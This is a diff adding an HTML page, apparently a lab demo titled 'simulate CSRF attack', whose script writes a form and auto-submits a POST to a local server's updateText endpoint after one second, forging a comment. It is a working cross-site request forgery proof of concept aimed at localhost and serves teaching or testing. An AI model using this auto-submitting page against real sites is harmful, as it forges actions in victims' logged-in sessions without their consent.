@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+</head>
+<body>
+    <p>模拟csrf攻击</p>
+    
+</body>
+<script>
+    document.write(`<form action="http://localhost:3000/updateText" method="post">
+                        <input type="text" name="text" value="CSRF评论。。" />
+                    </form>`)
+    var iframe = document.createElement('iframe');
+    iframe.name = 'csrf';
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+    setTimeout(() => {
+        document.querySelector('form').submit();
+    }, 1000)
+</script>
+</html>
